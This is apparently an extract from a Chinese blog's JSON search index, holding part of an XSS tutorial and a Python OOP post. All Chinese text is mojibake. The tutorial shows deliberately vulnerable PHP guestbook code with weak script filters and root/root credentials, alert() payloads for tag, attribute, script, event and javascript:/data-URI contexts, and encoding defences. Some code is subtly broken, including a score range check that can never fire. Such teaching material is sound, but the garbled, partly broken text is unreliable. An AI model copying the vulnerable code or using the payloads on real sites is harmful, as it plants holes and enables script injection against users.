trim(string,charlist)å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œé¢„å®šä¹‰å­—ç¬¦åŒ…æ‹¬ã€\\tã€\\nã€\\x0Bã€\\rä»¥åŠç©ºæ ¼ï¼Œå¯é€‰å‚æ•°charlistæ”¯æŒæ·»åŠ é¢å¤–éœ€è¦åˆ é™¤çš„å­—ç¬¦ã€‚ mysqli_real_escape_string(string,connection)å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼ˆ\\x00ï¼Œ\\nï¼Œ\\rï¼Œ\\ï¼Œâ€˜ï¼Œâ€œï¼Œ\\x1aï¼‰è¿›è¡Œè½¬ä¹‰ã€‚ stripslashes(string)å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è¾“å…¥å¹¶æ²¡æœ‰åšXSSæ–¹é¢çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œä¸”å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨æ˜æ˜¾çš„å­˜å‚¨å‹XSSæ¼æ´ã€‚ å¯¹Messageå­—æ®µæ³¨å…¥XSSä»£ç ï¼š ç”±äºNameå­—æ®µåœ¨å‰ç«¯æœ‰å­—æ•°é™åˆ¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Burp SuiteæŠ“åŒ…ä¿®æ”¹å‚æ•°ã€‚ Medium Level 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phperror_reporting(E_ALL);if(isset($_POST[&#x27;btnSign&#x27;]))&#123; $servername = &quot;localhost&quot;; $username = &quot;root&quot;; $password = &quot;root&quot;; $dbname = &quot;security&quot;; // åˆ›å»ºè¿æ¥ $conn = new mysqli($servername, $username, $password, $dbname); // æ£€æµ‹è¿æ¥ if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error); &#125; else echo &quot;æ•°æ®åº“è¿æ¥æˆåŠŸ&quot;; echo &quot;&lt;hr&gt;&quot;; echo $_POST[&#x27;mtxMessage&#x27;]; $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); $message = strip_tags( addslashes( $message ) ); $message = mysqli_real_escape_string( $message ); $message = htmlspecialchars( $message ); $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = mysqli_real_escape_string( $name ); $sql = &quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;$message&#x27;,&#x27;$name&#x27;);&quot;; echo &quot;SQLæ’å…¥è¯­å¥ï¼š&quot;.$sql; echo &quot;&lt;hr&gt;&quot;; //$result = mysqli_query($query) or die(&#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; $conn-&gt;close();&#125;?&gt; ç›¸å…³å‡½æ•°ä»‹ç»ï¼š htmlspecialcharsï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ å­—ç¬¦ æ›¿æ¢å &amp; &amp;amp; &quot; &amp;quot;ï¼Œé™¤éè®¾ç½®äº† ENT_NOQUOTES â€™ è®¾ç½®äº† ENT_QUOTES åï¼Œ &amp;#039;(å¦‚æœæ˜¯ ENT_HTML401) ï¼Œæˆ–è€… &amp;apos;(å¦‚æœæ˜¯ ENT_XML1ã€ ENT_XHTML æˆ– ENT_HTML5)ã€‚ &lt; &amp;lt; &gt; &amp;gt; å¯ä»¥çœ‹åˆ°ï¼Œç”±äºå¯¹messageå‚æ•°ä½¿ç”¨äº†htmlspecialcharså‡½æ•°è¿›è¡Œç¼–ç ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç ï¼Œä½†æ˜¯å¯¹äºnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†&lt;script&gt;å­—ç¬¦ä¸²ï¼Œä»ç„¶å­˜åœ¨å­˜å‚¨å‹çš„XSSã€‚è·Ÿåå°„å‹XSSä¸€æ ·ï¼Œå¯ä»¥æŠ“åŒ…ä¿®æ”¹å‚æ•°ä½¿ç”¨åŒå†™ç»•è¿‡æˆ–å¤§å°å†™æ··æ·†ç»•è¿‡ã€‚ High Level 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(E_ALL);if(isset($_POST[&#x27;btnSign&#x27;]))&#123; $servername = &quot;localhost&quot;; $username = &quot;root&quot;; $password = &quot;root&quot;; $dbname = &quot;security&quot;; // åˆ›å»ºè¿æ¥ $conn = new mysqli($servername, $username, $password, $dbname); // æ£€æµ‹è¿æ¥ if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error); &#125; else echo &quot;æ•°æ®åº“è¿æ¥æˆåŠŸ&quot;; echo &quot;&lt;hr&gt;&quot;; echo $_POST[&#x27;mtxMessage&#x27;]; $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); $message = strip_tags( addslashes( $message ) ); $message = mysqli_real_escape_string( $message ); $message = htmlspecialchars( $message ); $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = mysqli_real_escape_string( $name ); $sql = &quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;$message&#x27;,&#x27;$name&#x27;);&quot;; echo &quot;SQLæ’å…¥è¯­å¥ï¼š&quot;.$sql; echo &quot;&lt;hr&gt;&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; $conn-&gt;close();&#125;?&gt; å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†&lt;script&gt;æ ‡ç­¾ï¼Œä½†æ˜¯å´å¿½ç•¥äº†imgã€iframeç­‰å…¶å®ƒå±é™©çš„æ ‡ç­¾ï¼Œå› æ­¤nameå‚æ•°ä¾æ—§å­˜åœ¨å­˜å‚¨å‹XSSã€‚ åŒæ ·æŠ“åŒ…ä¿®æ”¹nameå‚æ•°ä¸º &lt;img src=1 onerror=alert(\\xss\\)&gt; DOMå‹XSS åŸç† ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æäº¤ï¼Œè€Œä¸”å…¶ä¸­åŒ…å«XSSä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ã€‚å½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSä»£ç ï¼Œå¯¼è‡´å­˜åœ¨XSSæ¼æ´ã€‚ ç”±äºDOMæ˜¯åœ¨å®¢æˆ·ç«¯ä¿®æ”¹èŠ‚ç‚¹çš„ï¼Œæ‰€ä»¥åŸºäºDOMå‹çš„XSSæ¼æ´ä¸éœ€è¦äºæœåŠ¡å™¨ç«¯äº¤äº’ï¼Œå®ƒåªå‘ç”Ÿåœ¨å®¢æˆ·ç«¯å¤„ç†æ•°æ®çš„é˜¶æ®µã€‚ ä»£ç æ¡ˆä¾‹ 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Test DOM_XSS&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function replace()&#123; document.getElementById(&quot;id1&quot;).innerHTML = document.getElementById(&quot;dom_input&quot;).value; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h6 id=&quot;id1&quot;&gt;è¿™é‡Œä¼šæ˜¾ç¤ºè¾“å…¥çš„å†…å®¹&lt;/h6&gt; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;dom_input&quot; value=&quot;è¾“å…¥&quot;&gt;&lt;br&gt; &lt;input type=&quot;button&quot; value=&quot;æ›¿æ¢&quot; onclick=&quot;replace()&quot;&gt; &lt;/form&gt; &lt;hr&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 0x03 XSSæ¼æ´é˜²å¾¡ å› ä¸ºXSSæ¼æ´æ¶‰åŠè¾“å…¥å’Œè¾“å‡ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œæ‰€ä»¥å…¶ä¿®å¤ä¹Ÿåˆ†ä¸ºä¸¤ç§ã€‚ è¿‡æ»¤è¾“å…¥çš„æ•°æ®ï¼ŒåŒ…æ‹¬'â€™ï¼Œ&quot;ï¼Œ&lt;ï¼Œ&gt;ï¼Œon*ç­‰éæ³•å­—ç¬¦ã€‚ å¯¹è¾“å…¥åˆ°é¡µé¢çš„æ•°æ®è¿›è¡Œç›¸åº”çš„ç¼–ç è½¬æ¢ï¼ŒåŒ…æ‹¬HTMLå®ä½“ç¼–ç ã€Javascriptç¼–ç ç­‰ã€‚ HttpOnly HttpOnlyä¸»è¦é˜²å¾¡çš„æ˜¯XSSæ¼æ´ä¸­çš„CookieåŠ«æŒï¼Œæµè§ˆå™¨ç¦æ­¢é¡µé¢çš„JavaScriptè®¿é—®å¸¦æœ‰HttpOnlyå±æ€§çš„Cookieã€‚ä¾‹å¦‚ï¼š 1234567891011121314&lt;? phpsetcookie(&quot;cookie1&quot;, &quot;test1&quot;, NULL, NULL, NULL, NULL, FALSE);setcookie(&quot;cookie2&quot;, &quot;test2&quot;, NULL, NULL, NULL, NULL, TRUE);?&gt;&lt;html&gt;&lt;body&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; alert(document.cookie); &lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; è¿™æ®µä»£ç ä¸­ï¼Œcookie1æ²¡æœ‰HttpOnlyï¼Œcookie2è¢«æ ‡è®°ä¸ºHttpOnlyã€‚ è¾“å…¥æ£€æŸ¥ï¼ˆXSS Filterï¼‰ åœ¨XSSçš„é˜²å¾¡ä¸Šï¼Œè¾“å…¥æ£€æŸ¥ä¸€èˆ¬æ˜¯æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¸­æ˜¯å¦åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚&lt;ã€&gt;ã€â€™ã€&quot;ç­‰ã€‚å¦‚æœå‘ç°å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™å°†è¿™äº›å­—ç¬¦è¿‡æ»¤æˆ–è€…ç¼–ç ã€‚æ¯”è¾ƒæ™ºèƒ½çš„è¾“å…¥æ£€æŸ¥è¿˜ä¼šåŒ¹é…XSSçš„ç‰¹å¾ï¼Œæ¯”å¦‚æŸ¥æ‰¾ç”¨æˆ·æ•°æ®ä¸­æ˜¯å¦åŒ…å«äº†&lt;script&gt;ã€javascriptç­‰æ•æ„Ÿå­—ç¬¦ã€‚è€Œä¸”è¾“å…¥æ£€æŸ¥çš„é€»è¾‘å¿…é¡»æ”¾åœ¨æœåŠ¡å™¨ç«¯ä»£ç å®ç°ã€‚ ä½†æ˜¯XSS Filteræœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¯¹&quot;&lt;&quot;ã€&quot;&gt;&quot;ç­‰å­—ç¬¦çš„å¤„ç†ï¼Œå¯èƒ½ä¼šæ”¹å˜ç”¨æˆ·è¾“å…¥æ•°æ®çš„è¯­ä¹‰ã€‚å¹¶ä¸”ï¼Œè¾“å…¥çš„æ•°æ®ä¼šè¢«å±•ç¤ºåœ¨å¤šä¸ªåœ°æ–¹ï¼Œæ¯ä¸ªåœ°æ–¹çš„è¯­å¢ƒå„ä¸ç›¸åŒï¼Œä¾‹å¦‚ï¼š ç”¨æˆ·è¾“å…¥çš„æ˜µç§°å¦‚ä¸‹ï¼š 12$nickname = &#x27;æˆ‘æ˜¯&quot;å¤©æ‰&quot;&#x27;; å¦‚æœè¢«XSS Filterè½¬ä¹‰åï¼š 12$nickname = &#x27;æˆ‘æ˜¯\\&quot;å¤©æ‰\\&quot;&#x27;; å¦‚æœåœ¨HTMLä»£ç ä¸­å±•ç¤ºï¼š 12&lt;div&gt;æˆ‘æ˜¯\\&quot;å¤©æ‰\\&quot;&lt;/div&gt; å¦‚æœåœ¨JavaScriptä»£ç å±•ç¤ºï¼š 123var nick = &#x27;æˆ‘æ˜¯\\&quot;å¤©æ‰\\&quot;&#x27;;document.write(nick); è¾“å‡ºæ£€æŸ¥ ä¸€èˆ¬æ¥è¯´ï¼Œé™¤äº†å¯Œæ–‡æœ¬çš„è¾“å‡ºï¼Œåœ¨å˜é‡è¾“å…¥åˆ°HTMLé¡µé¢æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç æˆ–è½¬ä¹‰çš„æ–¹å¼æ¥é˜²å¾¡XSSæ”»å‡»ã€‚ HTMLEncode é’ˆå¯¹HTMLä»£ç çš„ç¼–ç æ–¹å¼æ˜¯HtmlEncodeï¼Œåœ¨HtmlEncodeä¸­è¦æ±‚è‡³å°‘è½¬æ¢ï¼š&amp;ã€&lt;ã€&gt;ã€&quot;ã€'ã€\\ã€‚ åœ¨PHPä¸­ï¼Œæœ‰htmlentities()å’Œhtmlspecialchars()ä¸¤ä¸ªå‡½æ•°å¯ä»¥æ»¡è¶³å®‰å…¨è¦æ±‚ã€‚ JavaScriptEncode JavaScriptEncodeéœ€è¦ä½¿ç”¨\\å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè€Œä¸”åœ¨å¯¹æŠ—XSSæ¼æ´æ—¶ï¼Œè¿˜è¦æ±‚è¾“å‡ºçš„å˜é‡å¿…é¡»åœ¨å¼•å·å†…éƒ¨ï¼Œä¾‹å¦‚ï¼š 123var x = escapeJavaScript($evil);var y = &#x27;&quot;&#x27;+escapeJavaScript($evil)+&#x27;&quot;&#x27;; å¦‚æœè¾“å…¥çš„æ˜¯1; alert(2)ï¼Œåˆ™ï¼š 123var x = 1; alert(2);var y = &quot;1; alert(2)&quot;; ç¬¬ä¸€è¡Œæ‰§è¡Œäº†é¢å¤–çš„ä»£ç ï¼Œç¬¬äºŒè¡Œåˆ™æ˜¯å®‰å…¨çš„ã€‚ æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨æ›´åŠ ä¸¥æ ¼çš„JavaScriptEncodeå‡½æ•°æ¥ä¿è¯å®‰å…¨â€”â€”é™¤äº†æ•°å­—å’Œå­—æ¯å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼Œéƒ½ä½¿ç”¨åå…­è¿›åˆ¶\\xHHçš„æ–¹å¼è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚ï¼š 12var x = 1\\x3balert\\x282\\x29; å…·ä½“å®ä¾‹ åœ¨HTMLæ ‡ç­¾ä¸­è¾“å‡º 123&lt;div&gt;$var&lt;/div&gt;&lt;a href=#&gt;$var&lt;/a&gt; è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯æ„é€ ä¸€ä¸ª&lt;script&gt;æ ‡ç­¾ï¼Œpayloadï¼š 123&lt;div&gt;&lt;script&gt;alert(xss)&lt;/script&gt;&lt;/div&gt;&lt;a href=#&gt;&lt;img src=# onerror=alert(1)&gt;&lt;/a&gt; é˜²å¾¡æ–¹å¼æ˜¯å¯¹å˜é‡ä½¿ç”¨HtmlEncodeã€‚ åœ¨HTMLå±æ€§ä¸­è¾“å‡º 12&lt;div id=&quot;abc&quot; name=&quot;$var&quot;&gt;&lt;/div&gt; payloadï¼š 1234&lt;div id=&quot;abc&quot; name=&quot;&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;&quot;&gt;&lt;/div&gt;&gt; é˜²å¾¡æ–¹å¼ä¹Ÿæ˜¯é‡‡ç”¨HtmlEncodeã€‚ åœ¨&lt;script&gt;æ ‡ç­¾ä¸­è¾“å‡º åœ¨&lt;script&gt;æ ‡ç­¾ä¸­è¾“å‡ºï¼Œé¦–å…ˆåº”è¯¥ç¡®ä¿è¾“å‡ºçš„å˜é‡åœ¨å¼•å·ä¸­ï¼š 1234&lt;script&gt;var x = &quot;$var&quot;;&lt;/script&gt; æ”»å‡»è€…é¦–å…ˆè¦å…ˆé—­åˆå¼•å·æ‰èƒ½å®æ–½XSSæ”»å‡»ï¼š 1234&lt;script&gt;var x = &quot;&quot;;alert(/xss/);//&quot;;&lt;/script&gt; é˜²å¾¡æ—¶ä½¿ç”¨JavaScriptEncodeã€‚ åœ¨äº‹ä»¶ä¸­è¾“å‡º 12&lt;a href=# onclick=&quot;funcA(&#x27;$var&#x27;)&quot; &gt;test&lt;/a&gt; payloadï¼švar = '); alert(/xss/);// å³ï¼š 12&lt;a href=# onclick=&quot;funcA(&#x27;&#x27;); alert(/xss/);//&#x27;)&quot; &gt;test&lt;/a&gt; é˜²å¾¡æ—¶ä½¿ç”¨JavaScriptEncodeç¼–ç ã€‚ åœ¨CSSä¸­è¾“å‡º ä¸€èˆ¬æ¥è¯´ï¼Œå°½å¯èƒ½ç¦æ­¢ç”¨æˆ·å¯æ§åˆ¶çš„å˜é‡åœ¨â€&lt;style&gt;æ ‡ç­¾â€œã€â€HTMLæ ‡ç­¾çš„styleå±æ€§â€œä»¥åŠâ€CSSæ–‡ä»¶â€œä¸­è¾“å‡ºã€‚ åœ¨åœ°å€ä¸­è¾“å‡º ä¸€ä¸ªURLç»„æˆå¦‚ä¸‹ï¼š 12[Protocal][Host][Path][Search][Hash] ä¾‹å¦‚ï¼š 1234567https:&#x2F;&#x2F;www.evil.com&#x2F;a&#x2F;b&#x2F;c&#x2F;?abc&#x3D;123#ssss[Protocal] &#x3D; &quot;https:&#x2F;&#x2F;&quot;[Host] &#x3D; &quot;www.evil.com&quot;[Path] &#x3D; &quot;&#x2F;a&#x2F;b&#x2F;c&#x2F;&quot;[Search] &#x3D; &quot;?abc&#x3D;123&quot;[Hash] &#x3D; &quot;#ssss&quot; ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨URLçš„pathï¼ˆè·¯å¾„ï¼‰æˆ–è€…searchï¼ˆå‚æ•°ï¼‰ä¸­è¾“å‡ºï¼Œä½¿ç”¨URLEncodeå³å¯ã€‚URLEncodeä¼šå°†å­—ç¬¦è½¬æ¢ä¸ºâ€%HHâ€œå½¢å¼ã€‚ ä½†åœ¨Protocalå’ŒHostä¸­ä¸èƒ½ä½¿ç”¨ä¸¥æ ¼çš„URLEncodeç¼–ç ï¼Œå› ä¸ºä¼šæŠŠ://ã€.ç­‰éƒ½ç¼–ç æ‰ã€‚ 12&lt;a href=&quot;$var&quot; &gt;Test&lt;/a&gt; æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä¼ªåè®®å®æ–½æ”»å‡»ï¼š 12&lt;a href=&quot;javascript:alert(1);&quot;&gt;Test&lt;/a&gt; å¯¹äºMozillaæ”¯æŒçš„dataURIä¼ªåè®®ï¼Œå®ƒèƒ½å¤Ÿå°†ä¸€æ®µä»£ç å†™åœ¨URIä¸­ï¼Œä¾‹å¦‚ï¼š 12&lt;a href=&quot;dataURI:test/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/a&gt; è¿™æ®µä»£ä¹°çš„æ„æ€æ—¶ï¼Œä»¥test/htmlçš„æ ¼å¼åŠ è½½ç¼–ç ä¸ºbase64çš„æ•°æ®ã€‚åŠ è½½å®Œæˆåå®é™…ä¸Šæ—¶ï¼š 12&lt;script&gt;alert(1)&lt;/script&gt; å¯¹äºè¿™ç§æ‰‹æ®µçš„æ”»å‡»ï¼Œé¦–å…ˆåº”è¯¥æ£€æŸ¥å˜é‡æ˜¯å¦æ˜¯ä»¥httpå¼€å¤´ï¼Œå¦‚æœä¸æ˜¯åˆ™è‡ªåŠ¨åŠ ä¸Šï¼Œå†å¯¹å˜é‡è¿›è¡ŒURLEncodeï¼Œå³å¯ä¿è¯æ²¡æœ‰æ­¤ç±»çš„XSSæ”»å‡»ã€‚","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"XSS","slug":"XSS","permalink":"http://ca0y1h.top/tags/XSS/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿","date":"2019-11-01T06:33:37.000Z","path":"Python/code/5.Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿/","text":"Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿ Pythonå¯¹äºç±»çš„å±æ€§çš„å¤„ç†æ˜¯éå¸¸çµæ´»çš„ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œå½“æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªclassï¼Œåˆ›å»ºäº†ä¸€ä¸ªclassçš„å®ä¾‹åï¼Œæˆ‘ä»¬å¯ä»¥ç»™è¯¥å®ä¾‹ç»‘å®šä»»ä½•å±æ€§å’Œæ–¹æ³• ã€‚ä»Šå¤©è¿™ä¸€ç¯‡æ–‡ç« å°±å°†ä¸¤ä¸ªå…³äºå¯¹è±¡çš„å±æ€§çš„ç”¨æ³•ï¼šslotså’Œ@propertyã€‚ __slots__å˜é‡ åœ¨ç±»ä¸­å®šä¹‰__slots__å˜é‡å¯ä»¥é™åˆ¶å®ä¾‹çš„å±æ€§ï¼Œæ¯”å¦‚ï¼Œ åªå…è®¸å¯¹Studentå®ä¾‹æ·»åŠ nameå’Œageå±æ€§ã€‚ 12class Student(): __slots__ = (&#x27;name&#x27;, &#x27;age&#x27;) å³ç”¨tupleå®šä¹‰å…è®¸ç»‘å®šçš„å±æ€§åç§°ï¼Œè¯•å›¾åœ¨å®ä¾‹ä¸­ç»‘å®šå…¶ä»–å±æ€§ä¼šå¾—åˆ°AttributeErrorçš„é”™è¯¯ã€‚ ä½¿ç”¨__slots__è¦æ³¨æ„ï¼Œ__slots__å®šä¹‰çš„å±æ€§ä»…å¯¹å½“å‰ç±»å®ä¾‹èµ·ä½œç”¨ï¼Œå¯¹ç»§æ‰¿çš„å­ç±»æ˜¯ä¸èµ·ä½œç”¨çš„ã€‚ é™¤éåœ¨å­ç±»ä¸­ä¹Ÿå®šä¹‰__slots__ï¼Œè¿™æ ·ï¼Œå­ç±»å®ä¾‹å…è®¸å®šä¹‰çš„å±æ€§å°±æ˜¯è‡ªèº«çš„__slots__åŠ ä¸Šçˆ¶ç±»çš„__slots__ã€‚ @property åœ¨ç»‘å®šå±æ€§æ—¶ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥æŠŠå±æ€§æš´éœ²å‡ºå»ï¼Œè™½ç„¶å†™èµ·æ¥å¾ˆç®€å•ï¼Œä½†æ˜¯ï¼Œæ²¡åŠæ³•æ£€æŸ¥å‚æ•°ï¼Œå¯¼è‡´å¯ä»¥æŠŠæˆç»©éšä¾¿æ”¹ï¼Œä¸ºäº†é™åˆ¶scoreçš„èŒƒå›´ï¼Œé€šå¸¸çš„åšæ³•å°±æ˜¯è®¾ç½®setå’Œgetæ–¹æ³•ã€‚å…·ä½“æ¥è¯´ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªset_score()æ–¹æ³•æ¥è®¾ç½®æˆç»©ï¼Œå†é€šè¿‡ä¸€ä¸ªget_score()æ¥è·å–æˆç»©ï¼Œè¿™æ ·ï¼Œåœ¨set_score()æ–¹æ³•é‡Œï¼Œå°±å¯ä»¥æ£€æŸ¥å‚æ•°ã€‚ ä½†æ˜¯é€šè¿‡Pythonå†…ç½®çš„@propertyå°±å¯ä»¥æŠŠä¸€ä¸ªæ–¹æ³•å˜æˆå±æ€§è°ƒç”¨ï¼š 12345678910111213class Student(): @property def score(self): return self._score; @score.setter def score(self, value): if not isinstance(value, int): raise ValueError(&quot;score must be an integer&quot;) if value &lt; 0 and value &gt; 100: raise ValueError(&#x27;score must between 0 ~ 100!&#x27;) self._score = value æŠŠä¸€ä¸ªgetteræ–¹æ³•å˜æˆå±æ€§ï¼Œåªéœ€è¦åŠ ä¸Š@propertyå°±å¯ä»¥äº†ï¼Œæ­¤æ—¶ï¼Œ@propertyæœ¬èº«åˆåˆ›å»ºäº†å¦ä¸€ä¸ªè£…é¥°å™¨@score.setterï¼Œè´Ÿè´£æŠŠä¸€ä¸ªsetteræ–¹æ³•å˜æˆå±æ€§èµ‹å€¼ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬å°±æ‹¥æœ‰ä¸€ä¸ªå¯æ§çš„å±æ€§æ“ä½œï¼š 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.score = 60 # OKï¼Œå®é™…è½¬åŒ–ä¸ºs.set_score(60)&gt;&gt;&gt; s.score # OKï¼Œå®é™…è½¬åŒ–ä¸ºs.get_score()60&gt;&gt;&gt; s.score = 9999Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! è¿˜å¯ä»¥å®šä¹‰åªè¯»å±æ€§ï¼Œåªå®šä¹‰getteræ–¹æ³•ï¼Œä¸å®šä¹‰setteræ–¹æ³•å°±æ˜¯ä¸€ä¸ªåªè¯»å±æ€§ï¼š 12345678910111213class Student(object): @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth å¤šé‡ç»§æ‰¿ åœ¨è°ˆåˆ°Pythonçš„å¤šé‡ç»§æ‰¿çš„æ—¶å€™ï¼Œç»•ä¸å¼€çš„ä¸€ä¸ªåè¯å°±æ˜¯MixInï¼Œå¦‚æœä¹‹å‰å†™è¿‡Django Restful Frameworkæ¡†æ¶ï¼Œä»å¾ˆå¤šå‡½æ•°åä¸­å°±å¯ä»¥çœ‹å‡ºé‡Œé¢ç”¨åˆ°äº†å¾ˆå¤šMixInã€‚ åœ¨è®¾è®¡ç±»çš„ç»§æ‰¿å…³ç³»æ—¶ï¼Œé€šå¸¸ï¼Œä¸»çº¿éƒ½æ˜¯å•ä¸€ç»§æ‰¿ä¸‹æ¥çš„ï¼Œä¾‹å¦‚ï¼ŒOstrichç»§æ‰¿è‡ªBirdã€‚ä½†æ˜¯ï¼Œå¦‚æœéœ€è¦â€œæ··å…¥â€é¢å¤–çš„åŠŸèƒ½ï¼Œé€šè¿‡å¤šé‡ç»§æ‰¿å°±å¯ä»¥å®ç°ï¼Œæ¯”å¦‚ï¼Œè®©Ostriché™¤äº†ç»§æ‰¿è‡ªBirdå¤–ï¼Œå†åŒæ—¶ç»§æ‰¿Runnableã€‚è¿™ç§è®¾è®¡é€šå¸¸ç§°ä¹‹ä¸ºMixInã€‚ æ¯”å¦‚ï¼š 12class Dog(Animal, RunnableMixIn, CarnivorousMixIn): pass MixInçš„ç›®çš„å°±æ˜¯ç»™ä¸€ä¸ªç±»å¢åŠ å¤šä¸ªåŠŸèƒ½ï¼Œè¿™æ ·ï¼Œåœ¨è®¾è®¡ç±»çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘é€šè¿‡å¤šé‡ç»§æ‰¿æ¥ç»„åˆå¤šä¸ªMixInçš„åŠŸèƒ½ï¼Œè€Œä¸æ˜¯è®¾è®¡å¤šå±‚æ¬¡çš„å¤æ‚çš„ç»§æ‰¿å…³ç³»ã€‚","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"ç¼–ç¨‹/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™","date":"2019-10-30T05:24:03.000Z","path":"Web_security/basic_learning/7.å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™/","text":"Webå®‰å…¨å­¦ä¹ 